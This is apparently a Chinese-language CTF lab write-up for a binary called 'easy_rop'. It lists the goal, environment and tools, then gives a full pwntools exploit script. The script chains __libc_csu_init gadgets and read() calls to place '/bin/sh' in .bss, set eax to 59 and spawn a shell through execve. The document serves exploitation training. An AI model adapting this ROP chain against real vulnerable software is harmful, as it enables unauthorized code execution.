# easy_rop 

## **【原理】**
rop

## **【目的】**
掌握ROP

## **【环境】**
Ubuntu 16.04

## **【工具】**
gdb、objdump、python、pwntools

## **【步骤】**
- 通过__libc_csu_init()函数来构造gadgets
- 通过设置eax为59调用execve('/bin/sh',NULL,NULL)

```py
#coding:utf-8
from pwn import *
import time

p = process("./easy_rop")
elf = ELF("./easy_rop")

syscall_addr = 0x400698
rop_addr1 = 0x40071a            #<__libc_csu_init+90>
rop_addr2 = 0x400700            #<__libc_csu_init+64>
bss_addr = 0x601050

offset = 0x18

#在bss段写入/bin/sh和syscall的地址
rop = ""
rop += offset*"A"
rop += p64(rop_addr1)
rop += p64(0)                   #rbx
rop += p64(1)                   #rbp
rop += p64(elf.got['read'])     #r12
rop += p64(0x20)                #r13    #rdx
rop += p64(bss_addr)            #r14    #rsi
rop += p64(0)                   #r15    #rdi
rop += p64(rop_addr2)           #ret    #read(0, bss_addr, 0x20)

#设置eax为59
rop += p64(0)
rop += p64(0)                   #rbx
rop += p64(1)                   #rbp
rop += p64(elf.got['read'])     #r12
rop += p64(0x40)                #r13    #rdx
rop += p64(bss_addr+ 0x10)      #r14    #rsi
rop += p64(0x0)                 #r15    #rdi
rop += p64(rop_addr2)           #ret    #read(0, bss_addr+0x10, 0x40)

#execve('/bin/sh', NULL, NULL)
rop += p64(0)
rop += p64(0)
rop += p64(1)
rop += p64(bss_addr + 8)        #syscall
rop += p64(0)                   #NULL
rop += p64(0)                   #NULL
rop += p64(bss_addr)            #'/bin/sh'
rop += p64(rop_addr2)           #execve('/bin/sh', NULL, NULL)

sleep(2)
p.sendline(rop)

#第一次read
sleep(1)
p.send(("/bin/sh\x00"+p64(syscall_addr)).ljust(0x20,'\x00'))

#第二次read
sleep(1)
p.send("A"*59)

sleep(1)
p.interactive()

```

## **【总结】**
